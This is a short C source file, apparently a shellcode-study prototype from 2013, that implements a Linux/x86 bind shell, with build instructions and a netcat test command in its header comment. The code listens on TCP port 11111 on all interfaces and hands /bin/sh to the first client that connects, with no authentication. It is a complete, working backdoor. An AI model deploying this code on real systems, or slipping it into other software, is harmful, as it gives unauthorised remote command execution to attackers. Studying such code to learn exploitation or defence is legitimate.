/*

 Shell Bind TCP - C Language
 Linux/x86 - IA-32

 Written in 2013 by Geyslan G. Bem, Hacking bits

 http://hackingbits.com
 geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.


 shell_bind_tcp_c

 * avoids SIGSEGV when reconnecting, setting SO_REUSEADDR (TIME_WAIT)


 # gcc -m32 shell_bind_tcp_c.c -o shell_bind_tcp_c
 # ./shell_bind_tcp_c

 Testing
 # nc 127.0.0.1 11111

*/

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{

	int resultfd, sockfd;
	int port = 11111;
	struct sockaddr_in my_addr;

	// syscall 102
	// int socketcall(int call, unsigned long *args);

	// sycall socketcall (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// syscall socketcall (sys_setsockopt 14)
        int one = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	// set struct values
	my_addr.sin_family = AF_INET; // 2
	my_addr.sin_port = htons(port); // port number
	my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

	// syscall socketcall (sys_bind 2)
	bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	// syscall socketcall (sys_listen 4)
	listen(sockfd, 0);

	// syscall socketcall (sys_accept 5)
	resultfd = accept(sockfd, NULL, NULL);

	// syscall 63
	dup2(resultfd, 2);
	dup2(resultfd, 1);
	dup2(resultfd, 0);

	// syscall 11
	execve("/bin/sh", NULL, NULL);

	return 0;
}
